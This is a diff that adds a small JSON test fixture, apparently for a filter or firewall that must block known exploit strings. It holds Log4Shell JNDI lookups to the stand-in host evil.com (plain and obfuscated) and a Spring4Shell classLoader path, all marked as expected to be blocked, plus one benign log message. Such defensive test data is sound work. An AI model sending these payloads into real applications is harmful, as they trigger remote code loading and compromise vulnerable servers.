@@ -1,0 +1,1 @@
+[{"payload":"${jndi:ldap://evil.com/x}","expectBlocked":true,"desc":"Log4Shell JNDI"},{"payload":"${${lower:j}ndi:ldap://evil.com}","expectBlocked":true,"desc":"Log4Shell obfuscated"},{"payload":"class.module.classLoader","expectBlocked":true,"desc":"Spring4Shell"},{"payload":"Normal log message","expectBlocked":false,"desc":"Normal text"}]
